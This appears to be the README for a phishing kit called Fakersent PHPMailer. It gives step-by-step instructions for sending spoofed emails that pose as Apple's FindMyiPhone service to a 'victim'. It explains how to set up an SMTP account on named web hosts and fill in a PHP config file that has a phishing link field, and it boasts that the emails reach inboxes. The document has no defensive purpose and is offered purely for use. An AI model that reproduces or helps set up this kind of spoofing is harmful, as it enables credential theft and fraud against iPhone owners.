# Installation & loading

Fakersent PHPMailer does not use a custom email like #Fakersent does.
```Custom email: support@icloud.com```
It will use the email of whatever SMTP settings you add to the .config file.

## Why ?
Because, php mailer is something free.
It uses your email's SMTP settings you can create in such places as cpanel. PHP Mailer changes the name to (FindMyiPhone) and sends the victim whatever you input in the blanks, along with the old map template.

This is our old method of sending spoofed emails, but we are no longer supporting. So thought it would be nice to share with some others as it still works, and hitting all emails inbox. 

## Setting up email account
First you will need to find a web host supporting SMTP.

```Support SSL SMTP: my.a2hosting.com```

```Support SSL SMTP: inmotionhosting.com```

Second you will need to create a custom email. You can do this in Cpanel just find [Email Accounts]
* Create email account (name@yourdoamin.com)

* Now at the end there should be some icons, find [Configurate Email CLient]

* Then find Manuel Settings

![Settings](http://fakersent.com/22.PNG)

## Configuring email_config.php

This one of the most simpliest things to do, all you have to do is copy and paste all info from SMTP settings. Enter password, and use email you created.

```php
<?php
define("HOST","web server here"); --- [INCOMING SERVER]
define("EMAIL","custom email"); --- [USERNAME]
define("PASSWORD","password"); --- [PASSWORD]
define("PORT","465"); [PORT]
define("LINK", "http://linkhere.com); [PHISHING LINK]
?>
```
Now click save and your all done.

## Error mean SMTP not open

If you come accross this error after testing your sender, then you webhost port is wrong or not open.

```Message could not be sent.Mailer Error: SMTP connect() failed. https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting```
